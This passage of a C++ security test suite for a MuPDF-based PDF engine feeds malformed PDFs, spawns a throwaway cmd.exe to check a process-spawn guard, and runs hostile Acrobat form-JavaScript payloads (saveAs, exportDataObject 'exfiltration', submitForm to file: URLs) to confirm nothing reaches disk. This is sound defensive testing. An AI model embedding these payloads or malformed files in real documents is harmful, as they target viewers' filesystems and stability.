    // The three Document entry points that load a page. pageInfo is FIRST
    // because it is the one reachable without any user interaction and the one
    // that was left fatal.
    const char* kOps[] = {"pageinfo", "page", "displaylist"};

    for (const char* op : kOps) {
        // CONTROL, per entry point. Without it a guard that refused every
        // document would satisfy the lethal case below for this op, and a
        // control taken only once (on one op) would not notice an entry point
        // that refuses everything.
        const Case shallow = runAtOp(8, op);
        ASSERT_TRUE(shallow.produced)
            << op << " at depth 8 produced no result (exit "
            << shallow.exitCode << ")";
        EXPECT_EQ(shallow.outcome, "rendered")
            << op << " refused an ordinary 8-level nest (" << shallow.what
            << ") -- every refusal assertion for this entry point is vacuous";

        // THE DEFECT. 4096 is the depth measured to TERMINATE the process. The
        // result file existing at all is the proof it no longer does: a dead
        // child writes nothing.
        const Case lethal = runAtOp(4096, op);
        ASSERT_TRUE(lethal.produced)
            << op << " at depth 4096 produced no result file (exit "
            << lethal.exitCode << ", last stage reached: \"" << lethal.stage
            << "\"). That is the GitHub #159 signature -- the process died "
               "inside MuPDF's recursive page load before it could report "
               "anything. This entry point is not going through "
               "pdfe::core::safeLoadPage().";
        EXPECT_EQ(lethal.outcome, "refused")
            << op << " loaded a 4096-level nest rather than refusing it";
        EXPECT_EQ(lethal.usable, "1")
            << op << " survived the refusal but left the document unusable";
        EXPECT_EQ(lethal.exitCode, 0u)
            << op << " exited " << lethal.exitCode << " rather than cleanly";
    }
#endif
}

TEST_F(MaliciousPdfAdvancedTest, ObjectStreamCorruptionHandled)
{
    // Cross-reference stream / object stream with corrupted entries.
    // Tests MuPDF's object stream parser robustness.
    std::string pdf =
        "%PDF-1.5\n"
        "1 0 obj\n<< /Type /XRef /Length 20 /W [1 2 1] /Size 5 "
        "/Root 2 0 R /Filter /FlateDecode >>\nstream\n"
        "\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF"
        "\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\n"
        "endstream\nendobj\n"
        "2 0 obj\n<< /Type /Catalog /Pages 3 0 R >>\nendobj\n"
        "3 0 obj\n<< /Type /Pages /Kids [4 0 R] /Count 1 >>\nendobj\n"
        "4 0 obj\n<< /Type /Page /Parent 3 0 R /MediaBox [0 0 612 792] "
        ">>\nendobj\n"
        "startxref\n9\n%%EOF\n";

    auto path = td_ / "corrupt_object_stream.pdf";
    writePdf(path, pdf);

    EXPECT_NO_THROW({
        auto doc = Document::open(ctx_, path);
        if (doc && doc->pageCount() > 0) {
            auto page = doc->page(0);
        }
    }) << "Corrupted object stream must not crash";
}

TEST_F(MaliciousPdfAdvancedTest, DeeplyNestedDictionaryHandled)
{
    // Dictionary nested 100 levels deep — tests recursion limits
    std::string nested = "<<";
    for (int i = 0; i < 100; ++i) {
        nested += " /Key << ";
    }
    nested += " /Value 1 ";
    for (int i = 0; i < 100; ++i) {
        nested += ">> ";
    }
    nested += ">>";

    std::string pdf =
        "%PDF-1.7\n"
        "1 0 obj\n<< /Type /Catalog /Pages 2 0 R /Metadata " + nested +
        " >>\nendobj\n"
        "2 0 obj\n<< /Type /Pages /Kids [3 0 R] /Count 1 >>\nendobj\n"
        "3 0 obj\n<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] "
        ">>\nendobj\n"
        "xref\n0 4\n0000000000 65535 f \n"
        "0000000009 00000 n \n0000000158 00000 n \n"
        "0000000215 00000 n \n"
        "trailer\n<< /Size 4 /Root 1 0 R >>\nstartxref\n0\n%%EOF\n";

    auto path = td_ / "deeply_nested_dict.pdf";
    writePdf(path, pdf);

    EXPECT_NO_THROW({
        auto doc = Document::open(ctx_, path);
        if (doc && doc->pageCount() > 0) {
            auto page = doc->page(0);
        }
    }) << "Deeply nested dictionary (100 levels) must not crash";
}

TEST_F(MaliciousPdfAdvancedTest, CircularIndirectObjectReference)
{
    // Object 4 references object 5, which references object 4 (cycle)
    std::string pdf =
        "%PDF-1.7\n"
        "1 0 obj\n<< /Type /Catalog /Pages 2 0 R >>\nendobj\n"
        "2 0 obj\n<< /Type /Pages /Kids [3 0 R] /Count 1 >>\nendobj\n"
        "3 0 obj\n<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] "
        "/Resources 4 0 R >>\nendobj\n"
        "4 0 obj\n<< /Font 5 0 R >>\nendobj\n"
        "5 0 obj\n<< /F1 4 0 R >>\nendobj\n"
        "xref\n0 6\n0000000000 65535 f \n"
        "0000000009 00000 n \n0000000058 00000 n \n"
        "0000000115 00000 n \n0000000220 00000 n \n"
        "0000000260 00000 n \n"
        "trailer\n<< /Size 6 /Root 1 0 R >>\nstartxref\n0\n%%EOF\n";

    auto path = td_ / "circular_objref.pdf";
    writePdf(path, pdf);

    auto start = std::chrono::steady_clock::now();
    EXPECT_NO_THROW({
        auto doc = Document::open(ctx_, path);
        if (doc) {
            auto dl = doc->createDisplayList(0);
            if (dl) doc->releaseDisplayList(dl);
        }
    });
    auto elapsed = std::chrono::steady_clock::now() - start;
    EXPECT_LT(std::chrono::duration<double>(elapsed).count(), 5.0)
        << "Circular indirect references must not cause infinite loop";
}

#if defined(_WIN32)
// ── ProcessSpawnGuard job scoping ───────────────────────────────────────────
// The guard now scopes its observation to our own process tree (a Job Object,
// with a parent-PID descendant fallback) instead of counting attack-named
// processes machine-wide — which previously false-positived on any unrelated
// cmd.exe/powershell.exe on a busy dev/CI box. These prove (a) the scope set
// contains this process and (b) the oracle STILL detects a real in-tree spawn.

TEST(ProcessSpawnGuardScoping, JobContainsSelf) {
    auto pids = pdfe_test::jobProcessIds();
    if (pids.empty()) {
        // Job unavailable on this host → the guard uses the descendant-walk
        // fallback (rooted at GetCurrentProcessId()); DetectsInTreeSpawn still
        // exercises the end-to-end scoping.
        GTEST_SKIP() << "Job Object unavailable; descendant fallback in use";
    }
    EXPECT_NE(pids.count(::GetCurrentProcessId()), 0u)
        << "the test process must be a member of its own scoping job";
}

TEST(ProcessSpawnGuardScoping, DetectsInTreeSpawn) {
    // A process WE spawn is in our tree, so the guard must still flag it — proving
    // the scoping did not blind the oracle to real spawns. Spawned suspended so
    // the observation is race-free, then terminated.
    pdfe_test::ProcessSpawnGuard guard;

    wchar_t cmdline[] = L"cmd.exe /c exit";
    STARTUPINFOW si{};
    si.cb = sizeof(si);
    PROCESS_INFORMATION pi{};
    ASSERT_TRUE(::CreateProcessW(nullptr, cmdline, nullptr, nullptr, FALSE,
                                 CREATE_SUSPENDED | CREATE_NO_WINDOW,
                                 nullptr, nullptr, &si, &pi))
        << "failed to spawn a test child (err=" << ::GetLastError() << ")";

    const std::string seen = guard.newlySpawned();

    ::TerminateProcess(pi.hProcess, 0);
    ::WaitForSingleObject(pi.hProcess, 2000);
    ::CloseHandle(pi.hThread);
    ::CloseHandle(pi.hProcess);

    EXPECT_EQ(seen, "cmd.exe")
        << "the guard must still detect a cmd.exe spawned inside our own process tree";
}

TEST(ProcessSpawnGuardScoping, ObservesTransientInTreeSpawn) {
    // A NON-suspended `cmd.exe /c exit` starts AND fully exits fast — the case the
    // old poll-based snapshot misses (a false NEGATIVE). The Job completion-port
    // monitor records the new-in-job event at creation, so the guard still observes
    // it. We assert the race-free "observed" signal (image-name resolution is
    // best-effort and can lose the race for an already-exited process; the
    // observation of the spawn itself does not).
    pdfe_test::ProcessSpawnGuard guard;

    wchar_t cmdline[] = L"cmd.exe /c exit";
    STARTUPINFOW si{};
    si.cb = sizeof(si);
    PROCESS_INFORMATION pi{};
    ASSERT_TRUE(::CreateProcessW(nullptr, cmdline, nullptr, nullptr, FALSE,
                                 CREATE_NO_WINDOW, nullptr, nullptr, &si, &pi))
        << "failed to spawn a test child (err=" << ::GetLastError() << ")";
    // Let it fully exit — the exact fast-exit case the poll-based guard misses.
    ::WaitForSingleObject(pi.hProcess, 3000);
    ::CloseHandle(pi.hThread);
    ::CloseHandle(pi.hProcess);

    // The monitor thread delivers JOB_OBJECT_MSG_NEW_PROCESS asynchronously; give it
    // a brief bounded window for cross-thread visibility (event DELIVERY is reliable
    // — this is not a spawn/exit race).
    bool observed = false;
    for (int i = 0; i < 200 && !observed; ++i) {
        observed = guard.observedNewInJobProcess();
        if (!observed) ::Sleep(10);
    }
    EXPECT_TRUE(observed)
        << "the completion-port monitor must observe a transient in-job spawn that "
           "already exited — the fast-exit gap the poll-based snapshot misses";
}
#endif  // _WIN32

// ============================================================================
// SEC-44 — hostile form JS must not reach the filesystem
// ============================================================================
//
// Every case below runs through JsApiSurfaceTest::runHostileJs, which now
// installs a FileWriteGuard alongside the ProcessSpawnGuard. The payloads are
// the documented Acrobat JavaScript routes to disk — none of which spawns a
// process, so the pre-existing oracle could not have seen any of them.
//
// {{TARGET}} is substituted with a real absolute path inside the watched
// scratch tree, so a payload that works has somewhere to land. Aiming these at
// a path that does not exist, or one the process cannot write, would make the
// filesystem do the refusing and the test would be green regardless of what
// the sandbox does.

TEST_F(JsApiSurfaceTest, DocSaveAsWritesNothing)
{
    runHostileJs("this.saveAs('{{TARGET}}')", "doc_saveas");
}

TEST_F(JsApiSurfaceTest, DocCreateAndExportDataObjectWritesNothing)
{
    // The two-step exfiltration: stash bytes as an embedded file, then ask
    // the viewer to write them out to a chosen path.
    runHostileJs(
        "this.createDataObject('e.txt', 'exfil');"
        "this.exportDataObject({ cName: 'e.txt', cDIPath: '{{TARGET}}', "
        "nLaunch: 0 });",
        "doc_export_dataobject");
}

TEST_F(JsApiSurfaceTest, DocExportAsFdfWritesNothing)
{
    runHostileJs("this.exportAsFDF({ cPath: '{{TARGET}}' })", "doc_export_fdf");
}

TEST_F(JsApiSurfaceTest, DocExportAsXfdfWritesNothing)
{
    runHostileJs("this.exportAsXFDF({ cPath: '{{TARGET}}' })", "doc_export_xfdf");
}

TEST_F(JsApiSurfaceTest, SubmitFormToAFileUrlWritesNothing)
{
    // /SubmitForm with a file: URL is the classic "POST to disk" trick.
    runHostileJs("this.submitForm({ cURL: 'file:///{{TARGET}}' })",
                 "submitform_file_url");
}

TEST_F(JsApiSurfaceTest, ImportDataObjectDoesNotWriteOrDeleteAnything)
{
    // The read-side API. It must not write, and — the case the canary exists
    // for — it must not remove or truncate what is already there.
    runHostileJs("this.importDataObject('e', '{{TARGET}}')",
                 "import_dataobject");
}

TEST_F(JsApiSurfaceTest, ExecMenuItemSaveAsWritesNothing)
{
    // Driving the host application's own Save As, rather than a JS API.
    runHostileJs("app.execMenuItem('SaveAs')", "execmenuitem_saveas");
}

// ── The oracle's own vacuity guard ──────────────────────────────────────────
//
// Every case above asserts violation() == "". That assertion is worthless if
// violation() can only ever return "". These three cases perform the writes
// the payloads were trying to perform, directly, and require the guard to
// catch each one. If SEC-44's oracle is ever weakened, this is what goes red.

namespace {

// The oracle cases below need a directory that is EMPTY at construction.
//
// This is not hygiene, it is correctness, and the first run proved it: the
// created-file case reported MODIFIED instead of APPEARED, because a PREVIOUS
// run of the same test had left new.txt in the same %TEMP% subdirectory. The
// guard was right and the test's precondition was wrong — a leftover file
// makes "a file appeared" indistinguishable from "a file changed". Anything
// that watches a directory has to own its starting state.
std::filesystem::path freshOracleDir(const char* leaf)
{
    const auto d = tempDir() / leaf;
    std::error_code ec;
    std::filesystem::remove_all(d, ec);
    std::filesystem::create_directories(d, ec);
    return d;
}

}  // namespace

TEST(FileWriteGuardOracle, DetectsACreatedFile)
{
    const auto dir = freshOracleDir("fwg_create");
    pdfe_test::FileWriteGuard guard(dir, "fwg_create_marker");
    EXPECT_EQ(guard.violation(), "") << "clean baseline expected";

    { std::ofstream(guard.target("new.txt").string(), std::ios::binary) << "x"; }

    EXPECT_NE(guard.violation(), "")
        << "the guard did not notice a file appearing in the tree it watches";
    EXPECT_NE(guard.violation().find("APPEARED"), std::string::npos);
}

TEST(FileWriteGuardOracle, DetectsAModifiedFile)
{
    const auto dir = freshOracleDir("fwg_modify");
    const auto victim = dir / "victim.txt";
    { std::ofstream(victim.string(), std::ios::binary) << "original"; }

    pdfe_test::FileWriteGuard guard(dir, "fwg_modify_marker");
    EXPECT_EQ(guard.violation(), "");

    { std::ofstream(victim.string(), std::ios::binary) << "overwritten-longer"; }

    EXPECT_NE(guard.violation(), "")
        << "an in-place overwrite is a write; the guard must see it";
    EXPECT_NE(guard.violation().find("MODIFIED"), std::string::npos);
}

TEST(FileWriteGuardOracle, DetectsADeletedFile)
{
    // The half a "did anything new appear?" oracle would miss entirely, and
    // the reason runHostileJs plants a canary rather than watching an empty
    // directory.
    const auto dir = freshOracleDir("fwg_delete");
    const auto victim = dir / "victim.txt";
    { std::ofstream(victim.string(), std::ios::binary) << "original"; }

    pdfe_test::FileWriteGuard guard(dir, "fwg_delete_marker");
    EXPECT_EQ(guard.violation(), "");

    std::filesystem::remove(victim);

    EXPECT_NE(guard.violation(), "")
        << "silent deletion is the data-loss half of the property";
    EXPECT_NE(guard.violation().find("DELETED"), std::string::npos);
}

// An empty marker must mean "do not look at %TEMP% at all". The alternative —
// an empty filter matching every filename — would make the guard red on
// arrival under `run_gtest.py --shards 16`, where fifteen sibling processes
// are writing to the same directory throughout.
TEST(FileWriteGuardOracle, AnEmptyMarkerDoesNotDiffTheSharedTempRoot)
{
    const auto dir = freshOracleDir("fwg_nomarker");
    pdfe_test::FileWriteGuard guard(dir);
    EXPECT_TRUE(guard.marker().empty());

    // Write into %TEMP% itself, unmarked — a sibling shard's traffic.
    const auto noise = std::filesystem::temp_directory_path()
                     / "pdfe_unrelated_sibling_shard_noise.tmp";
    { std::ofstream(noise.string(), std::ios::binary) << "not ours"; }

    EXPECT_EQ(guard.violation(), "")
        << "unattributable %TEMP% traffic must not be reported as a violation";

    std::error_code ec;
    std::filesystem::remove(noise, ec);
}
